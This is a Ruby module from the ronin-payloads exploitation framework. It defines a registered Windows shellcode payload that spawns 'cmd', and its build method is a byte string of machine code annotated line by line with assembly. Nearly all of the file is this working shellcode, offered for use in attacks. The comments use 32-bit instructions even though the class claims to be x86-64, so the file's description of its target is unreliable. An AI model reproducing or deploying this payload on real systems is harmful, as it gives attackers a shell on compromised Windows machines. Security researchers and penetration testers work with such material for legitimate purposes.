# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Windows
        module X86_64
          #
          # Windows x86-64 shellcode that executes "cmd".
          #
          class CMD < ExecShellPayload

            register 'shellcode/windows/x86_64/cmd'

            arch :x86_64
            os :windows
            os_version '7'

            author "agix"

            summary 'Windows x86-64 cmd shellcode'
            description <<~DESC
              Windows x86-64 shellcode that executes "cmd"
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-627.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xC9" +                 # xor ecx,ecx
                         "\x64\x8B\x71\x30" +         # mov esi,[fs:ecx+0x30]
                         "\x8B\x76\x0C" +             # mov esi,[esi+0xc]
                         "\x8B\x76\x1C" +             # mov esi,[esi+0x1c]
                         "\x8B\x36" +                 # mov esi,[esi]
                         "\x8B\x06" +                 # mov eax,[esi]
                         "\x8B\x68\x08" +             # mov ebp,[eax+0x8]
                         "\xEB\x20" +                 # jmp short 0x35
                         "\x5B" +                     # pop ebx
                         "\x53" +                     # push ebx
                         "\x55" +                     # push ebp
                         "\x5B" +                     # pop ebx
                         "\x81\xEB\x11\x11\x11\x11" + # sub ebx,0x11111111
                         "\x81\xC3\xDA\x3F\x1A\x11" + # add ebx,0x111a3fda (for seven X86 add ebx,0x1119f7a6)
                         "\xFF\xD3" +                 # call ebx
                         "\x81\xC3\x11\x11\x11\x11" + # add ebx,0x11111111
                         "\x81\xEB\x8C\xCC\x18\x11" + # sub ebx,0x1118cc8c (for seven X86 sub ebx,0x1114ccd7)
                         "\xFF\xD3" +                 # call ebx
                         "\xE8\xDB\xFF\xFF\xFF" +     # call dword 0x15
                         "\x63\x6d\x64"               # db "cmd"
            end

          end
        end
      end
    end
  end
end
